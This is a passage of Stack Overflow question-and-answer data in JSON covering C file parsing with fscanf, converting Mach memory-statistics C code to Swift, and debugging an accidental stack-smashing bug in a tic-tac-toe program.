"https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1518573170, "post_id": 48778352, "comment_id": 84558646, "body": "Also check the return value from <code>fopen</code>"}], "answers": [{"tags": [], "owner": {"reputation": 4703, "user_id": 5375464, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/3292ca87ff6c766b75dbe4b2ea0831da?s=128&d=identicon&r=PG&f=1", "display_name": "J...S", "link": "https://stackoverflow.com/users/5375464/j-s"}, "is_accepted": false, "score": 0, "last_activity_date": 1518574458, "last_edit_date": 1518574458, "creation_date": 1518574014, "answer_id": 48778608, "question_id": 48778352, "link": "https://stackoverflow.com/questions/48778352/strange-characters-when-writing-to-csv-files-using-fprintf-in-c/48778608#48778608", "title": "Strange characters when writing to csv files using fprintf in C", "body": "<p>When you use <code>fscanf(fp, \"%s %s,%s\", phone_directory[i].First_Name, phone_directory[i].Last_Name, phone_directory[i].Phone_Number);</code> to read a string like <code>abc xyz,65656565</code>, the second <code>%s</code> will read the entire <code>xyz,65656565</code> part instead of stopping by the comma.</p>\n\n<p>To avoid this, you can use</p>\n\n<pre><code>fscanf(fp, \"%s %[^,],%s\", phone_directory[i].First_Name, phone_directory[i].Last_Name, phone_directory[i].Phone_Number);\n</code></pre>\n\n<p><code>%[^,]</code> means to keep scanning till but not including a <code>,</code> is encountered. </p>\n\n<p><a href=\"http://en.cppreference.com/w/c/io/fscanf\" rel=\"nofollow noreferrer\"><code>fscanf()</code></a> returns the number of successful assignments (or <code>EOF</code> on error). You can check its return value (which in this case should be <code>3</code> if successful) to see if all the variables were assigned values.</p>\n\n<pre><code>if( fscanf(fp, \"%s %[^,],%s\", str1, str2, str3)!=3 )\n{\n    printf(\"\\nSomething went wrong!\");\n}\n</code></pre>\n\n<p>To prevent overflow, you might want to specify the filed width in the format string like</p>\n\n<pre><code>fscanf(fp, \"%49s %49[^,],%49s\", str1, str2, str3)\n</code></pre>\n\n<p>if 50 is the size of each character array. The last character would be needed to store the <code>\\0</code> character.</p>\n\n<p>Also, check the return value of <a href=\"http://en.cppreference.com/w/c/io/fopen\" rel=\"nofollow noreferrer\"><code>fopen()</code></a> to see if the file was successfully opened or not. It returns <code>NULL</code> on error.</p>\n\n<p>For example,</p>\n\n<pre><code>if( (fp=fopen('input.txt', 'r'))==NULL )\n{\n    perror(\"\\nError opening file!\");\n}\n</code></pre>\n\n<p>And as was suggested in the comments, read <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">this</a> post.</p>\n"}, {"tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 0, "last_activity_date": 1518574601, "last_edit_date": 1518574601, "creation_date": 1518574271, "answer_id": 48778639, "question_id": 48778352, "link": "https://stackoverflow.com/questions/48778352/strange-characters-when-writing-to-csv-files-using-fprintf-in-c/48778639#48778639", "title": "Strange characters when writing to csv files using fprintf in C", "body": "<p>First things first: <a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Why is while ( !feof (file) ) always wrong?</a></p>\n\n<p>A problem with <code>fscanf</code> &amp; friends is that they will leave the newline in the input buffer\nand this is a problem for subsequent calls of <code>fscanf</code>, specially if you\nmix different conversion specifiers. There is also an error in the way you\nstated the format, more on this later in the answer. If you want to know how to\nuse <code>sscanf</code> in a <code>while</code>-loop, <a href=\"https://stackoverflow.com/questions/3975236/how-to-use-sscanf-in-loops\">read this</a>.</p>\n\n<p>You should check the return value of <code>fscanf</code>, it tells you how many conversions\nwere done and if <code>EOF</code> has been reached:</p>\n\n<pre><code>int convs;\n\nwhile((convs = fscanf(fp, \"%s %[^,],%s\", s1, s2, s3)) &amp;&amp; convs != 3 &amp;&amp; convs != EOF)\n{\n    printf(\"%s %s,%s\\n\", s1, s2, s3);\n    i++;\n}\n</code></pre>\n\n<p>I changed the arguments to <code>s1</code>, <code>s2</code> and <code>s3</code> because you orginal are just too\nlong and it's hard to read. The idea is what matters.</p>\n\n<p>Here you end the loop when <code>fscanf</code> did not convert all three values and when\n<code>fscanf</code> reached <code>EOF</code>. The problem with this is however that it is hard to\nrecover from errors, because you don't know exactly where it happened. There is\na second problem though, which I explaint in the next part of the answer.</p>\n\n<p>For this reason it is far superior to read the whole line with <code>fgets</code> and then\nto parse it with <code>sscanf</code>. If <code>sscanf</code> fails to parse, you can recover and use\nother parsing strategies (such as using <code>strtok</code>, or <code>strstr</code>, etc):</p>\n\n<pre><code>char line[1024];\n\nwhile(fgets(line, sizeof line, fp))\n{\n    int convs = sscanf(line, \"%s %[^,],%s\", s1, s2, s3);\n    if(convs != 3)\n    {\n        // error handling\n        // return/exit/use another parsing strategy/whatever\n    }\n}\n</code></pre>\n\n<p>One problem with <code>%s,%s</code> is that for the input <code>\"a,b\"</code>, only one string will be\nconverted: <code>\"a,b\"</code>. That's because <code>%s</code> matches a sequence of non-white-space characters and\n<code>,</code> is not a white-space, so <code>scanf</code> won't stop until it finds a non-white-space\ncharacter. That's why I changed it to <code>\"%[^,],%s\"</code> so that the first conversion\nmatches everything until the comma.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user8859314"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 343, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1518574601, "creation_date": 1518571841, "question_id": 48778352, "link": "https://stackoverflow.com/questions/48778352/strange-characters-when-writing-to-csv-files-using-fprintf-in-c", "title": "Strange characters when writing to csv files using fprintf in C", "body": "<p>I am trying to insert First Name, Last Name and Phone Number using fprintf to a CSV file.\nBut after the insertion additional strange characters and commas are being inserted at the end of each line, and while reading the file it is creating problems.</p>\n\n<p>Following is my code:</p>\n\n<pre><code>FILE *fp;\n    fp = fopen(filePath, \"r\");\n    int i = 0;\n***** Writing *****\nFILE *fp;\n    fp = fopen(\"input.csv\", \"a\");\n    fprintf(fp,\"%s %s ,%s\\n\", firstname, lastname , phone_number);\n</code></pre>\n\n<p>***** Reading *****</p>\n\n<pre><code>while(!feof(fp)){   \n        fscanf(fp, \"%s %s,%s\", phone_directory[i].First_Name, phone_directory[i].Last_Name, phone_directory[i].Phone_Number);\n        printf(\"%s %s,%s\\n\", phone_directory[i].First_Name, phone_directory[i].Last_Name, phone_directory[i].Phone_Number);\n        i=i+1;\n}\n</code></pre>\n\n<p>***** Input ******</p>\n\n<pre><code>//First Entry\n\nabc xyz,65656565\n\n//Second Entry\n\nuvw efg,6979679679\n</code></pre>\n\n<p>***** Output *****</p>\n\n<pre><code>abc xyz,65656565,\n, uvw,\nefg,6979679679 ,,\n ,\n</code></pre>\n\n<p>Please Help!!!</p>\n"}, {"tags": ["c", "swift"], "comments": [{"owner": {"reputation": 297030, "user_id": 1226963, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/yjY1E.png?s=128&g=1", "display_name": "rmaddy", "link": "https://stackoverflow.com/users/1226963/rmaddy"}, "edited": false, "score": 0, "creation_date": 1518568312, "post_id": 48777852, "comment_id": 84557392, "body": "You should point out which lines are giving you the errors."}, {"owner": {"reputation": 1335, "user_id": 9333764, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KxUuh.jpg?s=128&g=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/9333764/jake"}, "edited": false, "score": 1, "creation_date": 1518568565, "post_id": 48777852, "comment_id": 84557471, "body": "check the type of pagesize and if it&#39;s a UIInt_32 convert it to a UIInt_64. Then the host_statistics() function is all in C pretty much. The <code>&amp;</code> is a pointer and they don&#39;t work in swift. Try adding <code>@objc</code> to that part"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518569145, "post_id": 48777852, "comment_id": 84557636, "body": "Given that the core of that function is the call to <code>host_statistics</code>, and given that the call to <code>host_statistics</code> can&#39;t be converted to swift, why bother changing the function?"}, {"owner": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "reply_to_user": {"reputation": 1335, "user_id": 9333764, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KxUuh.jpg?s=128&g=1", "display_name": "Jake", "link": "https://stackoverflow.com/users/9333764/jake"}, "edited": false, "score": 0, "creation_date": 1518569503, "post_id": 48777852, "comment_id": 84557729, "body": "@Jake, I tried by converting pagesize to UInt32 and UInt64 both but no luck."}, {"owner": {"reputation": 47412, "user_id": 3141234, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/78b45a835031f4ce03a6653b3262b5d3?s=128&d=identicon&r=PG", "display_name": "Alexander", "link": "https://stackoverflow.com/users/3141234/alexander"}, "edited": false, "score": 0, "creation_date": 1518574802, "post_id": 48777852, "comment_id": 84559029, "body": "<code>&#47;&#47; Set up the variables</code> when was this written? :| Declaring all locals at the start of a block like that has been obsolete for decades in C"}, {"owner": {"reputation": 47412, "user_id": 3141234, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/78b45a835031f4ce03a6653b3262b5d3?s=128&d=identicon&r=PG", "display_name": "Alexander", "link": "https://stackoverflow.com/users/3141234/alexander"}, "edited": false, "score": 0, "creation_date": 1518574862, "post_id": 48777852, "comment_id": 84559046, "body": "The <code>return -1</code> is a very strong indication that you should probably implement this in Swift as a function that returns an <code>Int?</code>, and returns nil in that case"}, {"owner": {"reputation": 15118, "user_id": 7258538, "user_type": "registered", "profile_image": "https://graph.facebook.com/10102111546405895/picture?type=large", "display_name": "Charles Srstka", "link": "https://stackoverflow.com/users/7258538/charles-srstka"}, "reply_to_user": {"reputation": 47412, "user_id": 3141234, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/78b45a835031f4ce03a6653b3262b5d3?s=128&d=identicon&r=PG", "display_name": "Alexander", "link": "https://stackoverflow.com/users/3141234/alexander"}, "edited": false, "score": 1, "creation_date": 1518711952, "post_id": 48777852, "comment_id": 84627207, "body": "@Alexander Or make it a throwing function that returns an <code>Int</code>, and throw an error instead of returning <code>-1</code> or <code>nil</code>."}], "answers": [{"comments": [{"owner": {"reputation": 15118, "user_id": 7258538, "user_type": "registered", "profile_image": "https://graph.facebook.com/10102111546405895/picture?type=large", "display_name": "Charles Srstka", "link": "https://stackoverflow.com/users/7258538/charles-srstka"}, "reply_to_user": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "edited": false, "score": 1, "creation_date": 1518569971, "post_id": 48778088, "comment_id": 84557870, "body": "@user1101733 Just cast the <code>UInt32</code> to a <code>vm_size_t</code>. Swift requires types in math operations to be the same, unlike C, which is why you&#39;re getting that error."}, {"owner": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "edited": false, "score": 0, "creation_date": 1518571149, "post_id": 48778088, "comment_id": 84558154, "body": "-Working :-) I was trying reverse- Was converting vm_size_t to UInt32. Why this was not working? any idea"}, {"owner": {"reputation": 15118, "user_id": 7258538, "user_type": "registered", "profile_image": "https://graph.facebook.com/10102111546405895/picture?type=large", "display_name": "Charles Srstka", "link": "https://stackoverflow.com/users/7258538/charles-srstka"}, "reply_to_user": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "edited": false, "score": 0, "creation_date": 1518571683, "post_id": 48778088, "comment_id": 84558272, "body": "@user1101733 <code>vm_size_t</code> is a typealias to <code>UInt</code>, which has a larger maximum than <code>UInt32</code>. If you do a bunch of add and multiply operations on a <code>UInt32</code> and the result is larger than what a <code>UInt32</code> can hold, you&#39;ll crash."}, {"owner": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "edited": false, "score": 0, "creation_date": 1518579069, "post_id": 48778088, "comment_id": 84560026, "body": "Yes, It was crashing."}, {"owner": {"reputation": 15118, "user_id": 7258538, "user_type": "registered", "profile_image": "https://graph.facebook.com/10102111546405895/picture?type=large", "display_name": "Charles Srstka", "link": "https://stackoverflow.com/users/7258538/charles-srstka"}, "reply_to_user": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "edited": false, "score": 0, "creation_date": 1518715229, "post_id": 48778088, "comment_id": 84629269, "body": "I updated the answer to Swift 4.1. Currently this requires the Xcode 9.3 beta, but since Xcode 9.3 will probably be released before too long, this answer is better for posterity, as it&#39;s cleaner and doesn&#39;t require you to fuss around with <code>MemoryLayout</code>. For a Swift 4.0-compatible version, check the edit history."}], "tags": [], "owner": {"reputation": 15118, "user_id": 7258538, "user_type": "registered", "profile_image": "https://graph.facebook.com/10102111546405895/picture?type=large", "display_name": "Charles Srstka", "link": "https://stackoverflow.com/users/7258538/charles-srstka"}, "is_accepted": true, "score": 3, "last_activity_date": 1518715154, "last_edit_date": 1518715154, "creation_date": 1518569736, "answer_id": 48778088, "question_id": 48777852, "link": "https://stackoverflow.com/questions/48777852/c-code-to-swift-conversion/48778088#48778088", "title": "C code to swift conversion", "body": "<p>Swift is a lot more strict about pointer types than C is, which can make it a real pain to interact with functions like this that expect you to pass pointers to types other than the actual type of the thing you're trying to pass to the function. So I agree with the commenters that you're probably better off leaving this function in (Objective-)C. However, if you absolutely <em>have</em> to convert to Swift, you're probably going to have to do something like this:</p>\n\n<pre><code>// Initialize a blank vm_statistics_data_t\nvar vm_stat = vm_statistics_data_t()\n\n// Get a raw pointer to vm_stat\nlet err: kern_return_t = withUnsafeMutableBytes(of: &amp;vm_stat) {\n    // Bind the raw buffer to Int32, since that's what host_statistics\n    // seems to want a pointer to.\n    let boundBuffer = $0.bindMemory(to: Int32.self)\n\n    // Call host_statistics, and return its status out of the closure.\n    return host_statistics(host_port, HOST_VM_INFO, boundBuffer.baseAddress, &amp;host_size)\n}\n\n// Now take a look at what we got and compare it against KERN_SUCCESS\nif err != KERN_SUCCESS {\n    // Error, failed to get Virtual memory info\n    return -1;\n}\n</code></pre>\n"}], "owner": {"reputation": 234, "user_id": 1101733, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2d9a017444e6e280f6615eba2ae0676a?s=128&d=identicon&r=PG", "display_name": "user1101733", "link": "https://stackoverflow.com/users/1101733/user1101733"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 280, "favorite_count": 0, "accepted_answer_id": 48778088, "answer_count": 1, "score": 0, "last_activity_date": 1518715154, "creation_date": 1518567890, "last_edit_date": 1518574648, "question_id": 48777852, "link": "https://stackoverflow.com/questions/48777852/c-code-to-swift-conversion", "title": "C code to swift conversion", "body": "<p>I am trying to convert below code to Swift:</p>\n\n<pre><code>{\n    // Set up the variables\n    double totalUsedMemory = 0.00;\n    mach_port_t host_port;\n    mach_msg_type_number_t host_size;\n    vm_size_t pagesize;\n\n    // Get the variable values\n    host_port = mach_host_self();\n    host_size = sizeof(vm_statistics_data_t) / sizeof(integer_t);\n    host_page_size(host_port, &amp;pagesize);\n\n    vm_statistics_data_t vm_stat;\n\n    // Check for any system errors\n    if (host_statistics(host_port, HOST_VM_INFO, (host_info_t)&amp;vm_stat, &amp;host_size) != KERN_SUCCESS) {\n        // Error, failed to get Virtual memory info\n        return -1;\n    }\n\n    // Memory statistics in bytes\n    natural_t usedMemory = (natural_t)((vm_stat.active_count +\n                            vm_stat.inactive_count +\n                            vm_stat.wire_count) * pagesize);\n    natural_t allMemory = [self totalMemory];\n\n\n    return usedMemory;\n}\n</code></pre>\n\n<p>My Swift code is:</p>\n\n<pre><code>{\n    // Set up the variables\n    var totalUsedMemory: Double = 0.00\n    var host_port: mach_port_t\n    var host_size: mach_msg_type_number_t\n    var pagesize:vm_size_t\n\n    // Get the variable values\n     host_port = mach_host_self()\n\n    host_size = mach_msg_type_number_t(MemoryLayout&lt;vm_statistics_data_t&gt;.stride / MemoryLayout&lt;integer_t&gt;.stride)\n\n    //                host_size = sizeof(vm_statistics_data_t) / sizeof(integer_t);\n    host_page_size(host_port, &amp;pagesize);\n\n    var vm_stat: vm_statistics_data_t ;\n\n    // Check for any system errors\n    if (host_statistics(host_port, HOST_VM_INFO, (host_info_t)&amp;vm_stat, &amp;host_size) != KERN_SUCCESS) {\n        // Error, failed to get Virtual memory info\n        return -1;\n    }\n    // Memory statistics in bytes\n    var usedMemory: Int64  = (Int64)((vm_stat.active_count + vm_stat.inactive_count + vm_stat.wire_count) * pagesize);\n\n    return usedMemory;\n}\n</code></pre>\n\n<p>I am getting these 2 errors:</p>\n\n<blockquote>\n  <p>**Binary operator '&amp;' cannot be applied to operands of type '(host_info_t).Type' (aka 'UnsafeMutablePointer.Type') and 'vm_statistics_data_t' (aka 'vm_statistics')</p>\n</blockquote>\n\n<p>in this statement \n<strong>host_statistics(host_port, HOST_VM_INFO, (host_info_t)&amp;vm_stat, &amp;host_size)</strong></p>\n\n<p>And</p>\n\n<blockquote>\n  <p>Binary operator '*' cannot be applied to operands of type 'UInt32' and 'vm_size_t' (aka 'UInt')**</p>\n</blockquote>\n\n<p>in this statement -\n<strong>var usedMemory: Int64  = (Int64)((vm_stat.active_count + vm_stat.inactive_count + vm_stat.wire_count) * pagesize);</strong></p>\n"}, {"tags": ["c", "buffer-overflow", "stack-smash"], "comments": [{"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518567058, "post_id": 48777701, "comment_id": 84557032, "body": "Are your arrays single characters or strings? You seem to be confused about that..."}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518567200, "post_id": 48777701, "comment_id": 84557078, "body": "I will add the real values to help"}, {"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 1, "creation_date": 1518568107, "post_id": 48777701, "comment_id": 84557328, "body": "Your whole program is just wrong. <code>char tab[3][3]</code>; <code>strcpy(col, &amp;tab[0][i]);</code> is taking the address of a single <code>char</code>, not a <code>char*</code> so it is full of undefined behavior."}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518568167, "post_id": 48777701, "comment_id": 84557347, "body": "@John3136 you mean I must change the parameters in the function so that they can work as pointers?"}, {"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518568368, "post_id": 48777701, "comment_id": 84557413, "body": "@MoonWalker. What you have now is wrong. You seem confused about whether you need chars or strings (you use chars but you talk about null terminators and use string functions). My opinion? For tic-tac-toe a 3x3 array of <code>char</code> is all you need. No <code>char*</code> and therefore no <code>strcpy</code> or <code>strcmp</code>"}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518568640, "post_id": 48777701, "comment_id": 84557488, "body": "@John3136 i used the strings because it is easier to compare with. If i say I want to compare a line with &quot;OOX&quot; it is easier if it is all about strings"}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 0, "creation_date": 1518568665, "post_id": 48777701, "comment_id": 84557493, "body": "Let us <a href=\"http://chat.stackoverflow.com/rooms/165099/discussion-between-moonwalker-and-john3136\">continue this discussion in chat</a>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518569004, "post_id": 48777701, "comment_id": 84557600, "body": "@MoonWalker how does that make it easier for columns and diagonals?"}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518569144, "post_id": 48777701, "comment_id": 84557633, "body": "@WeatherVane It is not easier for that situation, but I tried to solve that by concatenating the values of the columns/diagonals"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1518569296, "post_id": 48777701, "comment_id": 84557671, "body": "So you actually made it <b>harder</b>?"}, {"owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518603471, "post_id": 48777701, "comment_id": 84570653, "body": "@WeatherVane harder?"}], "answers": [{"tags": [], "owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "is_accepted": true, "score": 0, "last_activity_date": 1518623070, "creation_date": 1518623070, "answer_id": 48791051, "question_id": 48777701, "link": "https://stackoverflow.com/questions/48777701/stack-smashing-buffer-overflow-in-c/48791051#48791051", "title": "Stack smashing/Buffer overflow in C", "body": "<p>As @John3136 mentioned, my code was a mess.<br>\nSo, to solve the problem, I implemented a function to add a character to a string:</p>\n\n<pre><code>void AdicionaCar(char *s, char c){\n\n  int length = strlen(s);\n  s[length] = c;\n  s[length+1] = '\\0';\n\n}\n</code></pre>\n\n<p>and replaced all instances of <code>strcat</code> and <code>strcpy</code> with this function.<br>\nThen initialized the variables <code>diag</code> and <code>col</code> with a null-terminator, so that they could become strings. Changed the formal parameters to pointers (not all of them) and now the function header looks like this:</p>\n\n<pre><code>int Iminente(char (*tab)[3], char comp, char jog, char (*str)[3])\n</code></pre>\n"}], "owner": {"reputation": 154, "user_id": 5340004, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/0e85c9ab9c4b8cc7af2089f454a94ba2?s=128&d=identicon&r=PG&f=1", "display_name": "DMaxter", "link": "https://stackoverflow.com/users/5340004/dmaxter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 181, "favorite_count": 0, "accepted_answer_id": 48791051, "answer_count": 1, "score": 0, "last_activity_date": 1518623070, "creation_date": 1518566910, "last_edit_date": 1518567452, "question_id": 48777701, "link": "https://stackoverflow.com/questions/48777701/stack-smashing-buffer-overflow-in-c", "title": "Stack smashing/Buffer overflow in C", "body": "<p>I have this code </p>\n\n<pre><code>    int Iminente(char tab[3][3], char comp, char jog, char str[3][3]){\n\n    int i, j, X = 0, val;\n    char col[4], diag[2][4];\n\n    strcpy(diag[0], &amp;tab[0][0]); // Diagonal E-D C-B (= \\ )\n    strcat(diag[0], &amp;tab[1][1]);\n    strcat(diag[0], &amp;tab[2][2]);\n\n    strcpy(diag[1], &amp;tab[0][2]); // Diagonal D-E B-C (= / )\n    strcat(diag[1], &amp;tab[1][1]);\n    strcat(diag[1], &amp;tab[2][0]);\n\n    for(i = 0; i &lt; 3; i++){\n      strcpy(col, &amp;tab[0][i]); // Colunas\n      strcat(col, &amp;tab[1][i]);\n      strcat(col, &amp;tab[2][i]);\n\n      for(j = 0; j &lt; 3; j++){\n        if(strcmp(str[j], tab[i]) == 0){ // Verifica linhas\n          Jogar(tab, comp, InvPosicao(i, j));\n\n          return 1;\n        }\n\n        if(strcmp(str[j], col) == 0){ // Verifica colunas\n          Jogar(tab, comp, InvPosicao(i, j));\n\n          return 1;\n        }\n\n        if(!X){ // Verifica diagonais\n          if(strcmp(str[j], diag[0]) == 0){\n            Jogar(tab, comp, InvPosicao(j, j));\n\n            return 1;\n          }else if(strcmp(str[j], diag[1]) == 0){\n            val = 2 - j;\n            Jogar(tab, comp, InvPosicao(val, j));\n\n            return 1;\n          }\n        }\n      }\n      X = 1;\n    }\n\n    return 0;\n  }\n</code></pre>\n\n<p>The error only occurs when we reach instruction <code>return 0</code>. I can't find where it is exactly. All I can say is that all information is given by me (not the user) and I defined the variables according to the length I predicted it would be.<br>\nThis is part of the Tic-Tac-Toe game. here are the variables</p>\n\n<pre><code>tab - 3x3 table, each element is a char\ncomp - current computer char\njog - current player char\nstr - group of \"strings\" with 3 elements each with length 3 (null terminator not included)\n\ni, j - iterators\nX - \"state\" variable (not important)\nval - not important\ncol - string with the current column\ndiag - group of \"strings\" with 2 elements each with length 4 (null terminator included)\n</code></pre>\n\n<p>Values:</p>\n\n<pre><code>possible values for `str`:\n    char perder[3][3] = {{' ', jog, jog}, {jog, ' ', jog}, {jog, jog, ' '}};\n    char ganhar[3][3] = {{' ', comp, comp}, {comp, ' ', comp}, {comp, comp, ' '}};\n\nvalue for `tab`:\n    char jogo[3][3] = {' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' '}; // Elements can be ' ', 'O', or 'X'\n\nvalues for `jog` and `comp`:\n    'O' or 